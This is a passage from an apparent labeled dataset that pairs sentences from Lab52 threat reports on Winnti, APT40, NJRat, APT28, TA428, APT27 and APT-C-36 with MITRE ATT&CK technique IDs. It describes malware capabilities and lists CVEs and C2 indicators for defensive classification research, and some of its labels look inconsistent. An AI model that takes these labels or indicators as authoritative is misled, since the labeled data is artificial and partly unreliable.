"lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "Another relevant conclusion in this research, it is the strategy applied by Winnti Group to compromise as much organizations as they can.", "labels": ["G0044"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| **SHA-1** | **C&C Server URL** |", "labels": ["TA0011"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1195  | Supply Chain Compromise |", "labels": ["T1195"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1050  | New Service |", "labels": ["T1543"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1022  | Data Encrypted |", "labels": ["T1560"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1079  | Multilayer Encryption |", "labels": ["T1573"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1032  | Standard Cryptographic Protocol (RC4, RC5) |", "labels": ["T1573"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1043  | Commonly Used Port (80,443) |", "labels": ["T1071"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| T1009  | Binary Padding |", "labels": ["T1027"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1195  | Supply Chain Compromise | Winnti Has Compromised software provider companies |", "labels": ["T1195"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1085  | Rubdll32 | Winnti modifies Windows Dll files to persistance |", "labels": [], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1050  | New Service | Winnti creates a new service that runs in background |", "labels": ["T1543"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1060  | Registry Run Keys / Start folder | Winnti modify Windows Registry to check if should stop |", "labels": ["T1547"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1102  | Web Service | Winnti contact C&C |", "labels": ["T1102"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1140  | Deobfuscate / Decode Files or Information  | Winnti send information ofuscated |", "labels": ["T1140"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1012  | Query Registry | Winnti modifies Windows dll files to persistence |", "labels": ["T1012"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1024  | Custom Cryptographic | Winnti communicates the C&C with base64-encoded data |", "labels": ["T1573"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | TT1001 | Data Obfuscation |  Winnti uses Cryptographic Protocol (RC4, RC5)  |", "labels": ["T1573"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "| Enterprise  | T1219  | Remote Access Tools | Winnti installs backdoor that communicates with C&C to download executable code |", "labels": ["T1219"], "document": "lab52_2019-05-16_winnti-group-geostrategic-analysis-and"}, {"sentence": "Leviathan: Geostrategy and TTP (Tactics, Techniques and Procedures)", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "FireEye posted a relevant report regarding one of the most active threat groups; Leviathan, also known as TEMP, Periscope or TEMP. Jumper.", "labels": ["G0065", "G0065", "G0065", "G0065", "G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Leviathan has carried out several cyberattacks against the following countries: Cambodia, Belgium, Germany, Hong Kong, Phillipine Islands, Malaysia, Norway, Saudi Arabia, Switzerland and the United States.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The fields of the organizations which have been cyber attacked by Leviathan belong to the logistic, engineering, naval technology and naval defense industry ([1]).", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "**Geostratic analysis of the APT 40 campaign:**", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "In this APT 40 or Leviathan campaign, the countries that received cyberattacks were USA, Malaysia, Cambodia, Brunei, Philippine Islands and Hong Kong.", "labels": ["G0065", "G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The relation among the States involved in this geostrategic conflict in the Chinese Sea and the organizations that have been targeted by APT 40 is highly strong.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Moreover, it is important to mention that Saudi Arabia, Germany, Norway and UK has been targeted by Leviathan ([1]).", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "*Illustration 3: SouthEast countries targeted by Leviathan*", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "APT 40 has designed and carried out this campaign with the main goal of collecting classified information from navy and defense organizations.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "FireEye considers that presumably, Leviathan is an APT associated to the Chinese government and its main task and duties are focused on carrying out cyber-attacks to collect classified information.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Futhermore, some APT 40 IP have been identified and localized in China as 112.66.188[.]28 which is associated with a Chinese VPN.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "It is important to mention that the Command and Control that was intercepted by FireEye was configured in Chinese.", "labels": ["TA0011"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "* Web Shells: In organizations that were previously compromised, usually the threat actors leavesleft the servers infected, just in case they want to exfiltrate more information in the future, as they still guarantee access to the system.", "labels": ["T1505", "T1098", "T1041"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "* Spear Phishing: The threat group uses phishing emails to targeted organizations.", "labels": ["T1566", "T1566"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "In these campaigns they made use of links to Google drive to download the malware in their spear phishing emails with malicious attachments.", "labels": ["T1566", "T1566"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "o\u00a0\u00a0\u00a0 CVE-2012-0158 [2]", "labels": ["T1203"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "o\u00a0\u00a0\u00a0 CVE-2017-0199 [3]", "labels": ["T1203"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "o\u00a0\u00a0\u00a0 CVE-2017-8759 [5]", "labels": ["T1203"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "o\u00a0\u00a0\u00a0 CVE-2017-11882 [6]", "labels": ["T1203"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "When the threat actor has been able to access the systems they would try to get alternative points\u00a0 of access to the organization by expanding new backdoors or collecting user credentials.", "labels": ["TA0006", "TA0003"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Specifically, the new backdoors used in the organization ([8]):", "labels": ["TA0003"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "China Chopper: Web Shell that is able to execute code on compromised computers.", "labels": ["S0020", "T1505", "T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "This way, attackers can send commands via HTTP POST to infect servers.", "labels": ["T1071"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The web Shell is able to: list directories, access databases and in general any action allowed by .NET.", "labels": ["T1059", "T1083", "T1005"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Listing directories, files and storage.", "labels": ["T1083", "T1005"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Opening of reverse shells.", "labels": ["T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Taking screenshots, video and audio recording.", "labels": ["T1113", "T1125", "T1123"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Processing creation", "labels": ["T1543"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Modifying registry keys.", "labels": ["T1112"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Keylogging", "labels": ["T1056"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u25aa Modifying files.", "labels": ["T1565"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Badflick: Backdoor with the ability to modify the file system, open reverse shells and modify the configuration of the C2.", "labels": ["TA0011"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Airbreak (also called \u201cOrz\u201d): Malware which was programmed in JavaScript, with the capability to receive commands to execute from legitimate pages ([7]).", "labels": ["S0229", "S0229", "T1071", "T1071"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Beacon: It is a malware distributed by the Cobalt Strike platform.", "labels": ["S0154", "S0154"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "This malware is able to inject and execute codes and exfiltrate files.", "labels": ["T1055", "T1041"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The group usually collects corporate VPN credentials, as well as other remote administration services (see: SSH, RDP, etc.", "labels": ["TA0006"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "As in the previous stage, the group uses different tools and techniques to carry out \u00a0the privilege escalation.", "labels": ["TA0004"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "In this stage, the group mainly focuses on collecting credentials from both open and private sources, passwords and hashes.", "labels": ["TA0006"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "We could expect the use of tools like HOMEFRY, a tool based on Badflick and Airbreak with the ability to obtain and crack passwords.", "labels": ["S0229", "TA0006"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "As well as the use of native legitimate tools such as Windows Credential Editor or ProcDump.", "labels": [], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Leviathan collects passwords to access other computers in the network.", "labels": ["G0065", "TA0006", "TA0008"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u2022 MURKYSHELL: malware capable of scanning ports and network enumerations.", "labels": ["T1046"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u2022 Use of native Windows tools such as net.exe", "labels": ["S0039"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u2022 Use of web shells in the internal network, as internal servers usually are less secure than external servers.", "labels": ["T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Lateral movement:", "labels": ["TA0008"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Leviathan is accustomed to using its own scripts, web shells and accessible services of the computers in the network.", "labels": ["G0065", "T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "For each compromised computer, the group usually executes a malware and performs new procedures of information recognition and theft tasks.", "labels": ["TA0007"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Use of native tools such as at.exe (Task Scheduler) and net.exe (network resource management tool)", "labels": ["T1053", "S0039"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "MURKYTOP: Command line tool for equipment recognition ([8]).", "labels": ["S0233"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "DISHCLOTH: Brute force tool to attack different services.", "labels": ["T1110"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Leviathan uses backdoors and web shells to maintain persistence.", "labels": ["G0065", "T1059", "TA0003"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Use of Web Shells as China Chopper.", "labels": ["T1505"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "\u2022 Use of TCP ports 80 and 443.", "labels": ["T1071"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The threat group uses compressing tools to encrypt the information before exfiltrating it.", "labels": ["TA0010"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Illustration 6: Malware used by Leviathan in each phase.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise | T1078 | Valid Accounts | The group uses valid accounts to access to VPN, SSH and RDP services.|", "labels": ["T1078"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise | T1192 | SpearPhishing Link | Leviathan uses Google Drive links in their Spear-phishing campaigns.|", "labels": ["T1566"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise | T1193 | SpearPhishing Attachment | Leviathan spear-phishing emails typically leverage malicious attachments.|", "labels": ["T1566"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1189 | Drive by Compromise | Leviathan usually compromises strategic websites and the group also relies on multiple web shells.|", "labels": ["T1189"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1059 | Command-Line Interface | Leviathan uses different command line tools, like net.exe or MURKYTOP. |", "labels": ["T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1064 | Scripting | Leviathan uses custom scripts for internal reconnaissance and lateral movement.|", "labels": ["T1059"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1053 | Scheduled Task  | Leviathan uses at.exe for lateral movement |", "labels": ["T1053"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1100 |  Web Shell  | Leviathan relies on web shells such as China chopper.|", "labels": ["T1505"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1110 | Brute Force  | Leviathan uses custom brute force tools as DISHCLOTH. |", "labels": ["T1110"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1081 | Credential in Files | Leviathan uses a mix of credential harvesting tools and password dumpers like Windows Credential Editor or their malware HOMEFRY. |", "labels": ["T1552"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1046 | Network Service Scanning | Leviathan uses MURKYSHELL and net.exe for network service scanning.|", "labels": ["T1046"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1210 | Explotation of Remote Service | Leviathan usually compromises internal servers with known vulnerabilities.|", "labels": ["T1210"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1076 | Remote Desktop Protocol | Leviathan leverages RDP for lateral movement.|", "labels": ["T1021"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1021 | Remote Service | Leviathan leverages RDP and SSH to facilitate internal reconnaissance.|", "labels": ["T1021"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1002 | Data Compressed | Leviathan uses rar.exe to compress and encrypt files.|", "labels": ["T1560"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1022 | Data Encrypted | Leviathan uses rar.exe to compress and encrypt files.|", "labels": ["T1560"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "| Enterprise  | T1043 | Commonly Used Port | Leviathan uses mainly the TCP ports 80 and 443 for communications with their C2.|", "labels": ["T1071"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "The government of China is presumably using APT 40 to collect classified information from the governments that are involved in the OBOR route against the Chinese international policies.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "As we can see the defense industry is an important target for APT 40 as China aimed to grow and develop its defense resources to become one of the most important maritime army of the world.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "All the suppliers related with the defense industry should be aware that they would be an important target for APT 40 as well.", "labels": ["G0065"], "document": "lab52_2019-05-30_leviathan-geostrategy-and-ttp-technical"}, {"sentence": "Ongoing Njrat campaign against Middle East", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "One of these threats is Vengeance Justice Worm, also known as Vjw0rm, which is developed in Javascript.", "labels": ["T1059"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "This is a type of malware capable of acting as a RAT or spreading through removable devices, thus doing worm functions, among others.", "labels": ["T1091"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "[1] Its second main threat is Hallaj Pro RAT, a modified version of the well-known NJRat Trojan, which consists of a remote control tool known since 2013, and developed in .NET, and which has been seen on multiple occasions related to campaigns carried out against the Middle East.", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "The starting point of our investigation is the appearance of the command and control domain \u201clalik.linkpc[.]net\u201d in two samples found that corresponded to a Vjw0rm and a modified NJRat.", "labels": ["TA0011"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "After analyzing several of the related malware samples, it has been observed that most of them are different versions of NJRat.", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "Some interesting information has been obtained from the analysis of the samples of modified NJRat that were related to the domains and IP addresses previously investigated.", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "The capabilities presented by the analyzed samples are wide, allowing to act as a keylogger, execute native commands, take screenshots or use the camera, among many other options.", "labels": ["T1056", "TA0002", "T1113", "T1125"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "A quick search of the string \u201ctekide\u201d on the internet, shows in different sources, information about the user \u201cMr. Tekide\u201d relating this Nick with a malware author who is credited with ties to the Iranian government, and who has repeatedly been linked to the use of NJRat. [2][3]", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "The first one is in a packed .NET executable, which, after its execution, deciphers more logic of the threat, which contains the second string.", "labels": ["T1140"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "In this second phase, a resource embedded in the executable itself is decrypted and loaded directly into memory, consisting of the final payload, NJRat.", "labels": ["T1055"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "As mentioned above, this are some examples of the several layers of obfuscation and encryption that many samples have, to make it difficult for the analyst to analyze them.", "labels": ["T1027"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "In addition, NJRat\u2019s capabilities are extensive and well known.", "labels": [], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "Most samples contain two types, one called \u201ckl\u201d, which acts as a keylogger, and another called \u201cOK\u201d, which contains the other functionalities such as RAT capabilities.", "labels": ["T1056"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "In the following fragment, can be seen the code of the function used by the \u201cACT\u201d command which appears only in some samples to exfiltrate the title of the window on which the user is working.", "labels": ["T1005"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "The code of this method is very extensive, but in the following image, there is a fragment of the code related to the RAT logic oriented to the download and execute of extra binarys on the victim\u2019s machine, thus acting as a \u201cDropper\u201d of new threats or tools.", "labels": ["T1105"], "document": "lab52_2019-09-26_ongoing-njrat-campaign-against-middle"}, {"sentence": "(Cyber) GRU (XIV): conclusions", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "In this work, we have analyzed mainly the structure, targets and TTP of the GRU in the cyber field, based on the information brought to light during 2018 and which allowed to obtain a detailed knowledge of the Service and its activities, not only to intelligence services, but also to poor analysts like us who do not have all the capabilities that a state can have.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "The fact that we know the GRU better than a year ago does not mean that now it is a worse service than before; it will remain part of the elite, fulfilling its missions and acting \u201c*in any part of the world where it is required*\u201c, said one of its former directors.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "The GRU, or APT28, or whatever you want to name it, will continue to be a very important player in the cyber field and, of course, in the non-cyber realm.", "labels": ["G0007", "G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "We all make mistakes, and the GRU made them on that occasion \u2013 and they were published.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "However, it is more of a concern in certain circles that the GRU failed in its operations than to have leaked the identities or modus operandi of some of its members.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "Currently, we are aware of the cyber activity of two Service Units that work in a coordinated manner to benefit the interests of the Russian Federation ; one of them, Unit 26165 which is responsible for the technical operations of the GRU (CNE and CNA), while the other one is Unit 74455, which is responsible for the psychological operations (PSYOP) of the Service.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "APT28 is linked to the GRU, if it is not the name given to the cyber division of the Service.", "labels": ["G0007", "G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "So instead of \u2018fancy bear\u2019 we should call it \u2018old bear\u2019 (and change the logo to that of the attached image) and perhaps not only steals information for the benefit of the Russian government, but uses it intelligently in psychological operations.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "![](https://www.securityartwork.es/wp-content/uploads/2019/05/bear.jpg) APT28.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "We hope this work will help a little bit to get to know the GRU better, which we talked about briefly when we discussed the issue of the Russian cyber-intelligence community and which lately, for all that has happened, deserved a series of its own.", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "Now, we have to wait for new public information that allows us to also analyze the cyber division of the FSB. Until a few months ago, the FSB was better known than the GRU but surely it has aspects that we cannot even imagine\u2026", "labels": ["G0035", "G0035", "G0007"], "document": "lab52_2019-10-18_cyber-gru-xiv-conclusions"}, {"sentence": "Events, among others, like the parliamentary elections in Ukraine in 2007, the Ukraine-Russia gas dispute in 2005,\u00a0[the power outage](https://www.securityartwork.es/2016/02/23/the-blackout-revisited/) the Ukraine experienced earlier this year or the Russian-Chechen conflict manifest the (obvious and known) Russian interest in its geographical area of influence, actions allegedly attributed to\u00a0**APT28**\u00a0which we discussed in the second issue of this saga\u00a0[(in spanish)](https://www.securityartwork.es/2016/07/19/cyber-guerra-fria-ii-grupo-sofacy/).", "labels": ["G0007"], "document": "lab52_2019-10-18_cyber-iii-cold-war-hack"}, {"sentence": "Groups like APT28 (already mentioned) and APT29 were identified as possible culprits.", "labels": ["G0007", "G0016"], "document": "lab52_2019-10-18_cyber-iii-cold-war-hack"}, {"sentence": "This new ministry would be trained on the FSB, could also understand the FSO and the SVR, resembling, according to Kommersant and other experts with the KGB, in which Putin in fact managed to acquire the rank of lieutenant colonel.", "labels": ["G0035"], "document": "lab52_2019-10-18_cyber-iii-cold-war-hack"}, {"sentence": "According to the researcher,\u00a0[Andrei Soldatov](http://echo.msk.ru/programs/albac/41311/), some of the military operations in cyberspace attributed to Russia were coordinated by the FSB by which a \u2018new KGB\u2019 in these times, could mean the return to the old cold war in a new more technological environment and of which we know Russia has a strong technical control.", "labels": ["G0035"], "document": "lab52_2019-10-18_cyber-iii-cold-war-hack"}, {"sentence": "TA428 Group abusing recent conflict between Iran and USA", "labels": [], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "The document is in RTF format, and has an OLE object related with the Equation Editor.", "labels": ["T1566"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "During the last years, this OLE objects have been a good indicator that a document may aim to exploit the CVE-2018-0798 vulnerability in order to infect with some kind of malware.", "labels": ["T1203"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "This particular document turns out to be one of these examples, and does it by dropping a binary called 8.t. in the \u201c% TEMP%\u201d folder of the user.", "labels": ["T1566"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "Up to this point, everything coincides in terms of TTPs with what is described in the following report, from ProofPoint related with a suspected Chinese cybercrime Group known as [TA428]", "labels": [], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "After this infection chain, what we get is a DLL executable file with extension \u201c.wll\u201d used for \u201cWord.addin.8\u201d files, that is installed in the path \u201c%APPDATA%\\Microsoft\\Word\\STARTUP\u201d which causes that MSWord at the next application startup to load this \u201c.wll\u201d executable file.", "labels": ["T1204", "T1137", "T1137"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "This DLL consists in a packed version of a PoisonIvy RAT sample, that after a few seconds makes traffic to the C2 server \u201c95.179.131.29\u201d, through port 443, and in case of error, through port 8080 using HTTP traffic.", "labels": ["S0012", "TA0011", "T1027", "T1071"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "It is always critical to remain alert with any attachments that is related to any recent geopolitical conflict, as previously stated, the attackers usually take advantage of them as a mean of infecting their victims through this kind of phishing campaings.", "labels": ["T1566"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "| Poison IvyC2     | 95.179.131.29 |", "labels": ["S0012"], "document": "lab52_2020-01-09_icefog-apt-group-abusing-recent"}, {"sentence": "APT27 ZxShell RootKit module updates", "labels": ["S0412", "T1014"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "Within the toolset of the different APT groups, one of the most interesting elements and the one that generally worries the most, are their capabilities in Ring0, generally RootKit/Bootkit type threats that act with the maximum level of privileges.", "labels": ["T1014", "T1542"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "An example of this type of threats is the RootKit module of ZxShell RAT used by Emissary Panda (APT27), of which there is a relatively recent sample (Uploaded to Virustotal since 2019-09-21 17:59:39) that is also correctly signed, so it can be loaded in the latest version of Windows 10 and is perfectly functional as far as we have been able to check.", "labels": ["T1014", "S0412"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "As he describes in his blog, the capabilities of this Rootkit are basically the following:", "labels": ["T1014"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "\u2013 Redirect malicious files to benign files.", "labels": ["T1036"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "If you try to call CreateFile() to open a malicious file you\u2019ll get a handle to a benign file.", "labels": ["T1036"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "* **Network Connection Hiding**", "labels": ["T1564"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "\u2013 Hide network connections from tools like netstat,proceshacker\u2026", "labels": ["T1564"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "After analyzing the differences between this 5 funtcions, we have been able to observe that all the changes are focused on avoiding detections by slightly \u201cobfuscating\u201d some IOCs hardcoded as strings and code modification without impact in the capabilities on the driver\u2026", "labels": ["T1027"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "At code level, the impact this has had is that the function that redirects these files, now uses the \u201cwcrev\u201d function that flips the strings before passing them to the function that hides the files:", "labels": ["T1027"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "* Finally, they have moved part of the logic of some functions to another point, maintaining the same functionality.", "labels": ["T1027"], "document": "lab52_2020-01-13_apt27-rootkit-updates"}, {"sentence": "APT-C-36 recent activity analysis", "labels": ["G0099"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "From Lab52 we have been tracking during the last months the activity of the group APT-C-36.", "labels": ["G0099"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "If you don\u2019t know APT-C-36, we recommend the article mentioned [1] for more information.", "labels": ["G0099"], "document": "lab52_2020-01-15_apt-c-36-recent-activity"}, {"sentence": "In July 2019 the company TrendMicro published an article related to another group [2] that also seems to be focused on Colombia and some **TTPs** (**T**actics, **T**echniques and **P**rocedures) overlap with APT-C-36 although TrendMicro indicates that they don\u2019t consider this group as an advanced.", "labels": ["G0099"], 